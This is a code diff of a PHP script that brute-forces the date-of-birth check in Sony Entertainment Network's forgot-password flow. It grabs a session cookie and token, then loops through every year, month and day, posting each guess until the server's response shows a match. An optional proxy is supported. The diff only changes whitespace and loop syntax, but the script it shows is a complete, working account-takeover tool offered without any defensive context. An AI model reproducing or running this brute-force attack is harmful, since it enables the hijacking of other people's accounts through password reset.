@@ -7,14 +7,14 @@
 try
 {
 	$inputs = initInput();
-	
+
 	$url = $inputs['url'];
 	$startYear = (int)@$inputs['startYear'] ?: 1970;
 	$endYear = (int)@$inputs['endYear'] ? min( date( 'Y' ) , $inputs['endYear'] ) : date( 'Y' );
 	$startMonth = (int)@$inputs['startMonth'] ?: 1;
 	$endMonth = (int)@$inputs['endMonth'] ?: 12;
 	$proxy = @$inputs['proxy'];
-	
+
 	$connect = curl_init();
 	$proxy && curl_setopt( $connect , CURLOPT_PROXY , $proxy );
 	curl_setopt( $connect , CURLOPT_URL , $url );
@@ -33,23 +33,23 @@ try
 			'Accept-Language: en-US,en;q=0.8,it;q=0.6' ,
 		]
 	);
-	
+
 	$response = curl_exec( $connect );
 	$curlInfo = curl_getinfo( $connect );
-	
+
 	if( stripos( $curlInfo['url'] , 'invalid' ) )
 	{
 		throw new \Exception( 'invalid validate url.' );
 	}
-	
+
 	$headerSize = $curlInfo['header_size'];
 	$headers = substr( $response , 0 , $headerSize );
 	$response = substr( $response , $headerSize );
 	curl_close( $connect );
-	
+
 	$cookie = parseCookie( $headers );
 	$token = getToken( $response );
-	
+
 	$connect = curl_init();
 	$proxy && curl_setopt( $connect , CURLOPT_PROXY , $proxy );
 	curl_setopt( $connect , CURLOPT_RETURNTRANSFER , true );
@@ -63,15 +63,15 @@ try
 			'Referer: https://account.sonyentertainmentnetwork.com/external/forgot-password-verify-identity!input.action' ,
 		]
 	);
-	
-	foreach( range( $startYear , $endYear ) as $year )
+
+	for( $year = $startYear; $year <= $endYear; $year++ )
 	{
-		foreach( range( $startMonth , $endMonth ) as $month )
+		for( $month = $startMonth; $month <= $endMonth; $month++ )
 		{
-			foreach( range( 1 , 31 ) as $day )
+			for( $day = 1; $day <= 31; $day++ )
 			{
 				echo "try $year, $month, $day ... \n";
-				
+
 				curl_setopt(
 					$connect ,
 					CURLOPT_URL ,
@@ -83,13 +83,13 @@ try
 					"struts.token.name=blah_token&blah_token=$token&verifyType=dob&account.yob=$year&account.mob=$month&account.dob=$day"
 				);
 				$response = curl_exec( $connect );
-				
+
 				if( !$response )
 				{
 					echo "found : $year, $month, $day !\n";
 					return;
 				}
-				
+
 				$token = getToken( $response );
 			}
 		}
@@ -118,7 +118,7 @@ function parseCookie( $headers )
 			$cookies[$key] = $val;
 		}
 	}
-	
+
 	$cookiePairs = [];
 	foreach( $cookies as $name => $value )
 	{
@@ -151,11 +151,10 @@ function initInput()
 		list( $key , $val ) = explode( '=' , $valPair , 2 );
 		$inputs[$key] = $val;
 	}
-	
+
 	if( empty( $inputs['url'] ) )
 	{
 		throw new \Exception( 'please specify the validate url.' );
 	}
 	return $inputs;
 }
-
